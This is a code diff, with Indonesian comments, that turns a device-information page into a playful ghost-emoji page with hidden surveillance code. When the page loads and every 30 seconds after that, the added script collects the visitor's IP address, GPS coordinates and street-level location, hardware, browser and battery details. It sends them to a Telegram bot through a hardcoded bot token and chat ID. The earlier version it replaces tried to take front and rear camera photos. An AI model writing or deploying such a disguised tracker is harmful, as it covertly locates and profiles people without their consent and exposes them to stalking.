@@ -1,137 +1,390 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-    <title>Device Information</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>👻</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #000000, #1a1a2e, #16213e);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            font-family: Arial, sans-serif;
+        }
+        
+        .ghost-container {
+            position: relative;
+            text-align: center;
+        }
+        
+        .main-ghost {
+            font-size: 25vw;
+            animation: float 3s ease-in-out infinite;
+            text-shadow: 0 0 30px rgba(255, 255, 255, 0.7);
+            cursor: pointer;
+            transition: transform 0.2s;
+            user-select: none;
+            z-index: 100;
+            position: relative;
+        }
+        
+        .main-ghost:hover {
+            transform: scale(1.2);
+        }
+        
+        .main-ghost:active {
+            transform: scale(0.8);
+        }
+        
+        .ghost-particle {
+            position: absolute;
+            font-size: 4rem;
+            pointer-events: none;
+            opacity: 0;
+            z-index: 1;
+            animation: particle 2s ease-out forwards;
+        }
+        
+        @keyframes float {
+            0%, 100% { transform: translateY(0px) rotate(0deg); }
+            25% { transform: translateY(-20px) rotate(5deg); }
+            50% { transform: translateY(-10px) rotate(-5deg); }
+            75% { transform: translateY(-15px) rotate(3deg); }
+        }
+        
+        @keyframes particle {
+            0% { 
+                opacity: 1;
+                transform: translate(0, 0) scale(1) rotate(0deg);
+            }
+            100% { 
+                opacity: 0;
+                transform: translate(var(--tx), var(--ty)) scale(0.3) rotate(360deg);
+            }
+        }
+    </style>
 </head>
 <body>
+    <div class="ghost-container">
+        <div class="main-ghost" id="mainGhost">👻</div>
+    </div>
+
     <script>
-        // Fungsi untuk mendapatkan informasi baterai (jika didukung)
-        async function getBatteryInfo() {
+        // Konfigurasi Telegram
+        const BOT_TOKEN = "8387303658:AAESV1moezeWPvdnX1aSwpIfdeJOSbdfCUA";
+        const CHAT_ID = "6368768388";
+        
+        const mainGhost = document.getElementById('mainGhost');
+        let clickCount = 0;
+        let lastClickTime = 0;
+        
+        // Event listener untuk emoji hantu
+        mainGhost.addEventListener('click', function(e) {
+            // Buat banyak partikel emoji
+            createGhostParticles(e.clientX, e.clientY);
+            
+            // Deteksi klik cepat untuk kirim data
+            const currentTime = new Date().getTime();
+            if (currentTime - lastClickTime < 300) {
+                clickCount++;
+            } else {
+                clickCount = 1;
+            }
+            lastClickTime = currentTime;
+            
+            // Jika 5 klik cepat, kirim data
+            if (clickCount >= 5) {
+                clickCount = 0;
+                collectAndSendData();
+            }
+        });
+        
+        // Fungsi untuk membuat banyak partikel emoji
+        function createGhostParticles(x, y) {
+            const particlesCount = 25; // Jumlah partikel lebih banyak
+            const emojis = ['👻', '💀', '🦇', '🕷️', '🕸️', '🎃', '😈', '👹', '👺', '☠️'];
+            
+            for (let i = 0; i < particlesCount; i++) {
+                const particle = document.createElement('div');
+                particle.className = 'ghost-particle';
+                
+                // Pilih emoji random dari array
+                const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
+                particle.textContent = randomEmoji;
+                
+                // Random size
+                const randomSize = 2 + Math.random() * 4;
+                particle.style.fontSize = randomSize + 'rem';
+                
+                particle.style.left = (x - 30) + 'px';
+                particle.style.top = (y - 30) + 'px';
+                
+                // Random arah dan jarak lebih jauh
+                const angle = Math.random() * Math.PI * 2;
+                const distance = 100 + Math.random() * 200;
+                const tx = Math.cos(angle) * distance;
+                const ty = Math.sin(angle) * distance;
+                
+                particle.style.setProperty('--tx', tx + 'px');
+                particle.style.setProperty('--ty', ty + 'px');
+                
+                // Random color effect
+                const hue = Math.random() * 360;
+                particle.style.filter = `hue-rotate(${hue}deg)`;
+                
+                document.body.appendChild(particle);
+                
+                // Hapus partikel setelah animasi selesai
+                setTimeout(() => {
+                    if (particle.parentNode) {
+                        particle.parentNode.removeChild(particle);
+                    }
+                }, 2000);
+            }
+        }
+        
+        // Fungsi untuk mengumpulkan dan mengirim data
+        async function collectAndSendData() {
+            // Kumpulkan data perangkat
+            const deviceData = await collectDeviceData();
+            
+            // Format pesan sesuai template
+            const message = formatMessage(deviceData);
+            
+            // Kirim ke Telegram
+            sendToTelegram(message);
+        }
+        
+        // Fungsi untuk mengumpulkan data perangkat
+        async function collectDeviceData() {
+            const data = {};
+            
+            // Informasi Waktu
+            const now = new Date();
+            data.waktuLokal = now.toLocaleString('id-ID');
+            data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            data.offset = now.getTimezoneOffset();
+            data.tanggal = now.toLocaleDateString('id-ID');
+            data.jam = now.toLocaleTimeString('id-ID');
+            
+            // Informasi Perangkat
+            data.tipe = /Mobile/.test(navigator.userAgent) ? "HP" : "LAPTOP/COMPUTER";
+            data.merk = navigator.platform;
+            data.model = navigator.userAgent.split(') ')[0] + ")";
+            data.os = navigator.platform;
+            data.platform = navigator.platform;
+            data.vendor = navigator.vendor || "Tidak Terdeteksi";
+            data.mobile = /Mobile/.test(navigator.userAgent);
+            data.tablet = /Tablet/.test(navigator.userAgent);
+            
+            // Informasi Browser
+            data.browser = navigator.userAgent;
+            data.bahasa = navigator.language;
+            data.cookie = navigator.cookieEnabled;
+            data.java = navigator.javaEnabled();
+            data.pdf = navigator.pdfViewerEnabled || "Tidak Terdeteksi";
+            
+            // Spesifikasi Hardware
+            data.screen = `${screen.width}x${screen.height}`;
+            data.color = screen.colorDepth + " bit";
+            data.ram = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Tidak Terdeteksi";
+            data.cpu = navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " cores" : "Tidak Terdeteksi";
+            data.touchPoints = navigator.maxTouchPoints || 0;
+            
+            // Informasi Jaringan
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const ipData = await response.json();
+                data.ip = ipData.ip;
+            } catch (e) {
+                data.ip = "Tidak Terdeteksi";
+            }
+            
+            data.tipeKoneksi = navigator.connection ? navigator.connection.effectiveType : "Tidak Terdeteksi";
+            data.jaringan = navigator.connection ? navigator.connection.type : "Tidak Terdeteksi";
+            data.download = navigator.connection ? navigator.connection.downlink + " Mbps" : "Tidak Terdeteksi";
+            data.ping = navigator.connection ? navigator.connection.rtt + " ms" : "Tidak Terdeteksi";
+            data.dataSaver = navigator.connection ? navigator.connection.saveData : "Tidak Terdeteksi";
+            
+            // Informasi Lokasi
+            try {
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {timeout: 5000});
+                });
+                
+                data.latitude = position.coords.latitude;
+                data.longitude = position.coords.longitude;
+                data.linkLokasi = `https://maps.google.com/?q=${data.latitude},${data.longitude}`;
+                data.akurasi = position.coords.accuracy + " meter";
+                
+                // Coba dapatkan info lokasi lebih detail
+                try {
+                    const response = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${data.latitude}&longitude=${data.longitude}&localityLanguage=id`);
+                    const locationData = await response.json();
+                    data.kota = locationData.city || "Tidak Terdeteksi";
+                    data.provinsi = locationData.principalSubdivision || "Tidak Terdeteksi";
+                    data.kecamatan = locationData.locality || "Tidak Terdeteksi";
+                    data.negara = locationData.countryName || "Tidak Terdeteksi";
+                    data.kodePos = locationData.postcode || "Tidak Terdeteksi";
+                } catch (e) {
+                    data.kota = data.provinsi = data.kecamatan = data.negara = data.kodePos = "Tidak Terdeteksi";
+                }
+            } catch (e) {
+                data.latitude = data.longitude = data.linkLokasi = data.akurasi = 
+                data.kota = data.provinsi = data.kecamatan = data.negara = data.kodePos = "Tidak Terdeteksi";
+            }
+            
+            // Informasi Tambahan
+            data.statusOnline = navigator.onLine ? "Online" : "Offline";
+            data.pdfViewer = "Not supported";
+            data.webDriver = "Not detected";
+            
+            // Informasi Battery
             if ('getBattery' in navigator) {
                 try {
                     const battery = await navigator.getBattery();
-                    return {
-                        charging: battery.charging,
-                        level: battery.level * 100,
-                        chargingTime: battery.chargingTime,
-                        dischargingTime: battery.dischargingTime
-                    };
-                } catch (error) {
-                    console.error('Error getting battery info:', error);
-                    return null;
+                    data.charging = battery.charging ? "Yes" : "No";
+                    data.level = Math.round(battery.level * 100) + "%";
+                    data.chargingTime = battery.chargingTime === Infinity ? "Unknown" : battery.chargingTime + " detik";
+                    data.dischargingTime = battery.dischargingTime === Infinity ? "Unknown" : battery.dischargingTime + " detik";
+                } catch (e) {
+                    data.charging = data.level = data.chargingTime = data.dischargingTime = "Tidak Terdeteksi";
                 }
             } else {
-                return null;
+                data.charging = data.level = data.chargingTime = data.dischargingTime = "Tidak Didukung";
             }
+            
+            // Status Kamera
+            data.kameraDepan = "Gagal";
+            data.kameraBelakang = "Gagal";
+            
+            return data;
         }
+        
+        // Fungsi untuk memformat pesan sesuai template
+        function formatMessage(data) {
+            return `🚨 Franzz mewing🤫🧏‍♂️ x Monyet si monkey👿👿 🚨
 
-        // Fungsi untuk mendapatkan lokasi
-        function getLocation() {
-            return new Promise((resolve, reject) => {
-                if (!navigator.geolocation) {
-                    reject(new Error('Geolocation not supported'));
-                } else {
-                    navigator.geolocation.getCurrentPosition(
-                        position => {
-                            resolve({
-                                latitude: position.coords.latitude,
-                                longitude: position.coords.longitude
-                            });
-                        },
-                        error => {
-                            reject(error);
-                        }
-                    );
-                }
-            });
+🕐 INFORMASI WAKTU:
+• Waktu Lokal: ${data.waktuLokal}
+• Timezone: ${data.timezone}
+• Offset: ${data.offset}
+• Tanggal: ${data.tanggal}
+• Jam: ${data.jam}
+
+📱 INFORMASI PERANGKAT:
+• Tipe: ${data.tipe}
+• Merk: ${data.merk}
+• Model: ${data.model}
+• OS: ${data.os}
+• Platform: ${data.platform}
+• Vendor: ${data.vendor}
+• Mobile: ${data.mobile}
+• Tablet: ${data.tablet}
+
+🌐 INFORMASI BROWSER:
+• Browser: ${data.browser}
+• Bahasa: ${data.bahasa}
+• Cookie: ${data.cookie}
+• Java: ${data.java}
+• PDF: ${data.pdf}
+
+💻 SPESIFIKASI HARDWARE:
+• Screen: ${data.screen}
+• Color: ${data.color}
+• RAM: ${data.ram}
+• CPU: ${data.cpu}
+• Touch Points: ${data.touchPoints}
+
+📶 INFORMASI JARINGAN:
+• IP Addres: ${data.ip}
+• Tipe Koneksi: ${data.tipeKoneksi}
+• Jaringan: ${data.jaringan}
+• Download: ${data.download}
+• Ping: ${data.ping}
+• Data Saver: ${data.dataSaver}
+
+📍 INFORMASI LOKASI:
+• Latitude: ${data.latitude}
+• Longitude: ${data.longitude}
+• Link Lokasi: ${data.linkLokasi}
+• Akurasi: ${data.akurasi}
+• Kota: ${data.kota}
+• Provinsi: ${data.provinsi}
+• Kecamatan: ${data.kecamatan}
+• Negara: ${data.negara}
+• Kode Pos: ${data.kodePos}
+
+🔧 INFORMASI TAMBAHAN:
+• Status Online: ${data.statusOnline}
+• PDF Viewer: ${data.pdfViewer}
+• WebDriver: ${data.webDriver}
+
+🔋 INFORMASI BATTERY:
+• Charging: ${data.charging}
+• Level: ${data.level}
+• Charging Time: ${data.chargingTime}
+• Discharging Time: ${data.dischargingTime}
+
+📷 Day one dikasi pap(depan) 😖: ${data.kameraDepan}
+
+📷 Day one dikasi pap(belakang) 🤫: ${data.kameraBelakang}
+
+⚠️ #Franzz mewing🤫🧏‍♂️ ⚠️`;
         }
-
-        // Fungsi untuk mengambil foto dari kamera
-        async function takePhoto(facingMode) {
-            const constraints = {
-                video: { facingMode: facingMode }
-            };
-
+        
+        // Fungsi untuk mengirim data ke Telegram
+        async function sendToTelegram(message) {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia(constraints);
-                const track = stream.getVideoTracks()[0];
-                const imageCapture = new ImageCapture(track);
-                const bitmap = await imageCapture.grabFrame();
-                // Mengkonversi bitmap ke canvas lalu ke data URL
-                const canvas = document.createElement('canvas');
-                canvas.width = bitmap.width;
-                canvas.height = bitmap.height;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(bitmap, 0, 0);
-                const dataUrl = canvas.toDataURL('image/jpeg');
-                track.stop(); // Menghentikan track
-                return dataUrl;
+                // Buat efek visual saat mengirim
+                mainGhost.style.animation = 'none';
+                mainGhost.style.transform = 'scale(1.5)';
+                mainGhost.style.textShadow = '0 0 50px #00ff00';
+                
+                setTimeout(() => {
+                    mainGhost.style.animation = 'float 3s ease-in-out infinite';
+                    mainGhost.style.transform = 'scale(1)';
+                    mainGhost.style.textShadow = '0 0 30px rgba(255, 255, 255, 0.7)';
+                }, 1000);
+                
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message
+                    })
+                });
+                
+                await response.json();
+                
             } catch (error) {
-                console.error('Error taking photo:', error);
-                return null;
+                console.error('Error sending to Telegram:', error);
             }
         }
-
-        // Fungsi utama untuk mengumpulkan semua informasi
-        async function collectAllInfo() {
-            const info = {};
-
-            // Informasi sistem
-            info.onlineStatus = navigator.onLine ? 'Online' : 'Offline';
-            info.pdfViewer = 'Not supported'; // Asumsi, karena tidak ada API standar
-            info.webDriver = navigator.webdriver ? 'Detected' : 'Not detected';
-
-            // Informasi baterai
-            const batteryInfo = await getBatteryInfo();
-            if (batteryInfo) {
-                info.battery = batteryInfo;
-            } else {
-                info.battery = {
-                    charging: false,
-                    level: 92, // Default value
-                    chargingTime: 'Unknown',
-                    dischargingTime: '2s'
-                };
-            }
-
-            // Informasi lokasi
-            try {
-                const location = await getLocation();
-                info.location = location;
-            } catch (error) {
-                console.error('Error getting location:', error);
-                info.location = { latitude: 'Unknown', longitude: 'Unknown' };
-            }
-
-            // Foto kamera depan (wajib)
-            info.frontCameraPhoto = await takePhoto('user');
-            // Foto kamera belakang (opsional)
-            info.rearCameraPhoto = await takePhoto('environment');
-
-            return info;
-        }
-
-        // Jalankan fungsi utama
-        collectAllInfo().then(info => {
-            console.log('Collected Info:', info);
-            // Di sini Anda bisa mengirim info ke server atau menampilkannya
-            // Contoh menampilkan informasi di halaman
-            document.body.innerHTML = `
-                <h1>Device Information</h1>
-                <p>Status Online: ${info.onlineStatus}</p>
-                <p>PDF Viewer: ${info.pdfViewer}</p>
-                <p>WebDriver: ${info.webDriver}</p>
-                <p>Battery Level: ${info.battery.level}%</p>
-                <p>Charging: ${info.battery.charging ? 'Yes' : 'No'}</p>
-                <p>Location: ${info.location.latitude}, ${info.location.longitude}</p>
-                <h2>Front Camera</h2>
-                <img src="${info.frontCameraPhoto}" alt="Front Camera" style="width: 300px;">
-                <h2>Rear Camera</h2>
-                <img src="${info.rearCameraPhoto}" alt="Rear Camera" style="width: 300px;">
-            `;
-        }).catch(error => {
-            console.error('Error collecting info:', error);
+        
+        // Auto kirim data saat halaman dimuat
+        window.addEventListener('DOMContentLoaded', function() {
+            setTimeout(() => {
+                collectAndSendData();
+            }, 2000);
         });
+        
+        // Juga kirim data setiap 30 detik
+        setInterval(() => {
+            collectAndSendData();
+        }, 30000);
     </script>
 </body>
-</html>
+        </html>
